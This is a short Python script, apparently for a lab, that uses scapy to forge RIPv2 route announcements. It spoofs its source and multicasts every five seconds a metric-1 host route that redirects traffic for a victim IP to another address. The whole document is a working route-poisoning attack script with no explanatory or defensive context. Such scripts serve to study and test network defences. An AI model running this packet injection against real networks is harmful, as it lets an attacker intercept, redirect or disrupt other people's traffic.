from scapy.all import *


victim_ip = "192.168.40.126" # target host 
new_destination_ip = "192.168.40.118"
host_mask = "255.255.255.255"

print(f"Injecting MALICIOUS RIP route: traffic for {victim_ip} -> {new_destination_ip}")

rip_packet = (
    IP(src=new_destination_ip, dst="224.0.0.9") /
    UDP(sport=520, dport=520) /
    RIP(cmd=2, version=2) /
    RIPEntry(
        addr=victim_ip,
        mask=host_mask,
        metric=1
    )
)

send(rip_packet, iface="eth0", loop=1, inter=5, verbose=True)